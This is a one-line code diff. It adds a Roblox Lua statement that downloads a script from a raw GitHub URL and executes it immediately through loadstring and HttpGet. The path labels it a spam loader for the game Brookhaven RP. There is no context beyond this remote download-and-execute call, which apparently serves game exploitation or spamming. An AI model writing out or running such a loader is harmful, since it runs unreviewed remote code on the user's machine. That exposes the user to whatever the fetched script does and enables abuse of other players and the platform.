@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/brookhaven-rp-spam4-8c7bvd9hjrqkqs.lua"))()
